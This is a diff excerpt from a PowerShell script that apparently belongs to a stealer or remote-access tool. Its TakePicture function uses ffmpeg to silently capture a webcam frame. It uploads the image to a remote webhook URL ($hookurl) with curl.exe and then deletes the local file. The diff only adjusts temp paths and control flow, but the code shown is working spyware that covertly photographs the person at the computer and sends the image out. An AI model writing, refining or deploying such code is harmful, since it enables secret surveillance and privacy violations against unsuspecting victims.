@@ -822,9 +822,9 @@ Invoke-RestMethod -Uri $hookurl -Method Post -ContentType "application/json" -Bo
 }
 
 Function TakePicture {
-$outputFolder = "$env:TEMP\8zTl45PSA"
-$outputFile = "$env:TEMP\8zTl45PSA\captured_image.jpg"
-$tempFolder = "$env:TEMP\8zTl45PSA\ffmpeg"
+$outputFolder = "$env:TEMP"
+$outputFile = "$env:TEMP\captured_image.jpg"
+$tempFolder = "$env:TEMP\ffmpeg"
 if (-not (Test-Path -Path $outputFolder)) {
     New-Item -ItemType Directory -Path $outputFolder | Out-Null
 }
@@ -847,8 +847,7 @@ if ($videoDevice) {
     $videoInput = $videoDevice.Name
     $ffmpegPath = "$env:Temp\ffmpeg.exe"
     & $ffmpegPath -f dshow -i video="$videoInput" -frames:v 1 $outputFile -y
-} else {
-}
+    sleep 1
     curl.exe -F "file1=@$outputFile" $hookurl | Out-Null
     sleep 1
     Remove-Item -Path $outputFile -Force
